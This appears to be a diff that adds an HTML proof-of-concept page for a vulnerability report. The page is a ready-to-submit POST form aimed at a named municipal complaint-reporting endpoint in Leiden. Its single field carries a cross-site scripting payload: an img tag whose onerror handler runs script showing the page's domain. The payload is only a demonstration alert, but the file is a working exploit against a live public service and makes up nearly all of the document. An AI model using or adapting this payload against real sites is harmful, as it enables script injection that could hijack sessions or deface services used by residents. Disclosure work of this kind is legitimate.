@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>PoC</title>
+<style>
+table{
+  border: 1px solid lightgray;
+}
+</style>
+</head>
+<body>
+<b>POST target</b>
+<pre>https://melding.leiden.nl/leiden/handlers/postReportHandler.php</pre>
+<b>POST parameters</b>
+<br />
+<form action='https://melding.leiden.nl/leiden/handlers/postReportHandler.php' id='postForm' method='POST'>
+<table>
+  <tr>
+    <td>ithd</td>
+    <td><input type='text' name='ithd' value='{&quot;Ithd_text&quot;:&quot;&lt;img src onerror=&#x27;alert(`XSS in `+document.domain)&#x27;&gt;&quot;}' size='70'/></td>
+  </tr>
+</table>
+<br />
+<input type='submit' value='Submit' />
+</form>
+</body>
+</html>
